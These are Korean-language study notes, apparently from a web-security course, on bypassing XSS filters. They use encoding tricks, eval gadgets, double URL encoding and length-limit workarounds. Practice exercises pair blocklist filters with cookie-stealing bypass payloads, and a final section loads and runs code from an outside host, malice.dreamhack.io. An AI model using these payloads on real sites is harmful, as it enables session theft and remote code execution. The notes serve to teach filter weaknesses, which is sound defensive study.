# 자바스크립트 함수 및 키워드 필터링
Unicode excape sequnece를 통한 우회
```javascript
var foo = "\u0063ookie";  // cookie
var bar = "cooki\x65";  // cookie
\u0061lert(document.cookie);  // alert(document.cookie)
```

Computed member access를 이용한 우회
```javascript
alert(document["\u0063ook" + "ie"]);  // alert(document.cookie)
window['al\x65rt'](document["\u0063ook" + "ie"]);  // alert(document.cookie)
```

템플릿 리터럴 사용
```javascript
var foo = "Hello";
var bar = "World";
var baz = `${foo},
${bar} ${1+1}.`; // "Hello,\nWorld 2."
```

RegExp 객체 사용
```javascript
var foo = /Hello World!/.source;  // "Hello World!"
var bar = /test !/ + [];  // "/test !/"
```

fromCharCode 함수 사용
```javascript
var foo = String.fromCharCode(72, 101, 108, 108, 111);  // "Hello"
```

내장 함수 및 객체 문자를 이용
```javascript
var baz = history.toString()[8] + // "H"
(history+[])[9] + // "i"
(URL+0)[12] + // "("
(URL+0)[13]; // ")" ==> "Hi()"
```

진수 변환을 이용한 모습
```javascript
var foo = 29234652..toString(36); // "hello"
var bar = 29234652 .toString(36); // "hello"
```

javascript 스키마를 이용한 우회
```javascript
location="javascript:alert\x28document.domain\x29;";
location.href="javascript:alert\u0028document.domain\u0029;";
location['href']="javascript:alert\050document.domain\051;";
```

hasInstance를 이용한 우회
```javascript
"alert\x28document.domain\x29"instanceof{[Symbol.hasInstance]:eval};
Array.prototype[Symbol.hasInstance]=eval;"alert\x28document.domain\x29"instanceof[];
```

innerHTML을 이용한 우회 예시
```javascript
document.body.innerHTML+="<img src=x: onerror=alert&#40;1&#41;>";
document.body.innerHTML+="<body src=x: onload=alert&#40;1&#41;>";
```

## 실습문제
```javascript
function XSSFilter(data){
  if(/alert|window|document/.test(data)){
    return false;
  }
  return true;
}
/*
\u0061lert(\u0064\u006F\u0063\u0075\u006D\u0065\u006E\u0074.cookie);
*/

function XSSFilter(data){
  if(/alert|window|document|eval|cookie|this|self|parent|top|opener|function|constructor|[\-+\\<>{}=]/i.test(data)){
    return false;
  }
  return true;
}
/*
decodeURI, atob와 constructor 속성을 함께 사용하면 원하는 임의의 코드를 실행
// %63%6F%6E%73%74%72%75%63%74%6F%72 -> constructor
// %61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29 -> alert(document.cookie)
Boolean[decodeURI('%63%6F%6E%73%74%72%75%63%74%6F%72')](
      decodeURI('%61%6C%65%72%74%28%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29'))();
Boolean[atob('Y29uc3RydWN0b3I')](atob('YWxlcnQoZG9jdW1lbnQuY29va2llKQ'))();
*/

function XSSFilter(data){
  if(/[()"'`]/.test(data)){
    return false;
  }
  return true;
}
/*
/alert/.source+[URL+[]][0][12]+/document.cookie/.source+[URL+[]][0][13] instanceof{[Symbol.hasInstance]:eval};
location=/javascript:/.source + /alert/.source + [URL+0][0][12] + /document.cookie/.source + [URL+0][0][13];
*/
```


# 디코딩 전 필터링
웹 방화벽 검증 이후 다시 디코딩할 경우 공격자는 더블 URL 인코딩으로 웹 방화벽 검증 우회
```
POST /search?query=%253Cscript%253Ealert(document.cookie)%253C/script%253E HTTP/1.1
...
-----
HTTP/1.1 200 OK
<h1>Search results for: <script>alert(document.cookie)</script></h1>
```

# 길이 제한
location.hash를 이용한 공격 방식
```
https://example.com/?q=<img onerror="eval(location.hash.slice(1))">#alert(document.cookie); 
```

외부 자원을 이용한 공격 방식
```javascript
import("http://malice.dreamhack.io");

var e = document.createElement('script')
e.src='http://malice.dreamhack.io';
document.appendChild(e);

fetch('http://malice.dreamhack.io').then(x=>eval(x.text()))
```